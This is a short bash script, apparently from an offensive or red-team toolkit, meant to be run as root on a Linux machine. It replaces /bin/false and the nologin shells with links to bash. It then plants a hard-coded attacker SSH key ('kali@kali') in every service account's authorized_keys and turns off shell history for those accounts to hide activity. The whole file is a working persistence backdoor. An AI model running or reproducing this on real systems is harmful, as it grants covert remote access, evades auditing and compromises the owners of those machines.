#!/bin/bash
# DESCRIPTION: Allows all users to login and gives ssh keys

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

echo "=== Removing login restrictions and generating SSH keys ==="

# Make sure to set pubkey

# Remove nologin bins
rm /bin/false 2> /dev/null
rm /usr/sbin/nologin 2> /dev/null
rm /sbin/nologin 2> /dev/null

# Link nologin bins to bash
ln -s /bin/bash /bin/false 2> /dev/null
ln -s /bin/bash /usr/sbin/nologin 2> /dev/null
ln -s /bin/bash /sbin/nologin 2> /dev/null

# Find all nologin user's homedirs
echo "=== Writing credentials ==="
for homedir in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f6); do
    mkdir -p $homedir/.ssh 2> /dev/null
    touch $homedir/.ssh/authorized_keys 2> /dev/null
    touch $homedir/.bash_profile 2> /dev/null
    echo 'unset HISTFILE' >> $homedir/.bash_profile 2> /dev/null
    echo 'set +o history' >> $homedir/.bash_profile 2> /dev/null
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhemdnKj/KZTHsIrdVYFF4kXBiq8hnkEQg2y5TVooqF7KZvzL62BmHVFKteiFlEjObZ6oe9FK8kZ2CNnduaGvHyOSR7VcwQIv9yxWvjpcZV9vl3EeeSLg7j8KYDJcGCjJ4Fp8tms52y2/fKYxBxIjQrd+XLjeNjm2RDHPyGotGkrIQCaePv9qsuJLLHOsGTExZlEZV6Znk7ka0Q8m68QdV46PaCfm6Na+bkgkrU9IFYXkbU6tsd79lgr+q9qoGPx438xOcSeorp9LLBy2Pc0/rIB4bhMqBO+vmKEKgc9mmpgku4+HSshUGy1e07FFvHZ9VTfhmVay8UgZ2pOjCQdw5d7CYTl32S9hUQ2fCAXEMuZRyjHXBwPuv6Kty4ZPCWq7N3GRZNd4zJ++5h4ha0Z5+L3e+IYncEs4lr8Lf5lB8zgxbtrDV+Dg4BnWrgvMGiaUpLR/v7IPv/58Tx6p0/CyHFuEdFlPjKoo4rtOJcx59jw6ky3/n7EOKcV5MHtszkfs= kali@kali' >> $homedir/.ssh/authorized_keys
    echo "Wrote creds to $homedir"
done

echo "=== Users that now have SSH access ==="
for user in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f1); do
	echo $user
done

